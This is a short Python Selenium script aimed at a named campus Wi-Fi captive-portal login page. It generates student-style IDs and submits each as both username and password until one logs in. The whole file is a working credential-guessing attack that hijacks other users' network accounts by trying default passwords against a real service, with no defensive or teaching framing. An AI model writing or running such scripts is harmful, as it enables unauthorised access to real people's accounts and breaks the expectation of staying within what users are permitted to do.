from selenium import webdriver

d = []
for a in range(3000, 1443, -1):
    d.append('16BMA' + str(a))

browser = webdriver.PhantomJS()
browser.get('http://phc.prontonetworks.com/cgi-bin/authlogout?URI=http://phc.prontonetworks.com/')
browser.get('http://phc.prontonetworks.com/cgi-bin/authlogin?URI=http://www.msftconnecttest.com/redirect')
for a in d:
    try:
        userid = browser.find_element_by_name("userId")
        userid.send_keys(a)
        password = browser.find_element_by_name("password")
        password.send_keys(a)
        submit = browser.find_element_by_name("Submit22")
        submit.click()
    except:
        print(a)
        break
